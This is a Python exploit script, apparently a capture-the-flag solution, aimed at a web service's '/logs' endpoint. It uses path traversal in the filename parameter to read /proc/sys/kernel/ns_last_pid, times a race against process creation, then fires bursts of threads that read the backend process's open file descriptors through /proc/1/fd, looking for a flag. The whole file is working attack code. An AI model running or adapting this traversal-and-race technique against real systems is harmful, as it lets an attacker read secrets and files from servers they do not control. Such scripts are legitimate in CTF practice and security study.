import os
import threading
import time

import requests

HOST = "http://72.146.1.133:8084/"

s = requests.Session()

my_token = "JWT_TOKEN"

s.headers.update({"Cookie": f"session_token={my_token}"})


def check_fd(target_pid, fd):
    """
    Worker function to check a single File Descriptor as fast as possible.
    """
    try:
        r = s.get(
            HOST + "/logs",
            params={
                "filename": f"aa.txt/../../../../proc/{target_pid}/fd/{fd}",
            },
            timeout=3,
        )

        if "cyber" in r.text or "cybersphere" in r.text.lower():
            print(f"\n[$$$] BOOM! FLAG FOUND IN PID {target_pid} ON FD {fd}!")
            print("-" * 40)
            print(r.text.strip())
            print("-" * 40)
            with open("flag.txt", "w+") as f:
                f.write(r.text)

            os._exit(0)

    except Exception:
        pass


def hammer_go_process():
    target_pid = 1
    for fd in range(3, 26):
        for _ in range(3):
            threading.Thread(target=check_fd, args=(target_pid, fd)).start()


def main():
    last_pid = 0
    print("[*] Synchronizing with ns_last_pid...")

    while True:
        try:
            r = s.get(
                HOST + "/logs",
                params={
                    "filename": "aa.txt/../../../../../proc/sys/kernel/ns_last_pid",
                },
                timeout=3,
            )
            pid = int(r.text.strip())
        except Exception as e:
            time.sleep(0.1)
            continue

        if last_pid == 0:
            last_pid = pid
            print(
                f"[*] Baseline PID established at {last_pid}. Waiting for Docker healthcheck jump..."
            )
            continue

        if pid > last_pid:
            print(f"\n[*] ALARM! PID jumped {last_pid} -> {pid}")
            last_pid = pid

            print("[*] FIRING SHOTGUN BURST AT GO BACKEND (PID 1) FILE DESCRIPTORS...")
            hammer_go_process()

        time.sleep(0.05)


if __name__ == "__main__":
    main()
